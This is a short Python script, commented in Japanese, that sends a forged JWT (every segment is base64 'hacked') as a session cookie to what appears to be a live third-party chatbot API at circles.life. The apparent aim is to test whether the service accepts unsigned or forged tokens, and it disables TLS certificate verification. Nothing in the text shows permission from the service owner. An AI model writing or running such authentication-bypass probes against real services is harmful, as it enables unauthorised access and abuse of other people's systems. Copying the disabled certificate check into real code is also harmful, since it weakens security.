import requests
import json

# 適当な（壊れた・偽造した）JWTを作成
# 例: header/payload/署名部を全部"hacked"にする
forged_jwt = "aGFja2Vk.aGFja2Vk.aGFja2Vk"  # base64url("hacked") = aGFja2Vk

url = "https://aistore-api.circles.life/v1/povo/aistore/chatbot/completions"

headers = {
    "Content-Type": "application/json",
    "Cookie": f"session={forged_jwt}",
}

user_prompt = "これは偽造JWTのテストです"

data = {
    "user_prompt": user_prompt,
    "feature_id": "ai_apps_chatbox",
    "media_url": "",
    "search_web": True,
    "context_id": "",
    "ai_model": "sonar-pro",
    "conversation_type": "text",
    "deep_research": True,
    "user_time": "02:42:45 PM Asia/Tokyo",
}

try:
    response = requests.post(url, headers=headers, json=data, verify=False)
    response.raise_for_status()
    print(f"Status Code: {response.status_code}")
    print("Response Text:")
    print(response.text)
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}") 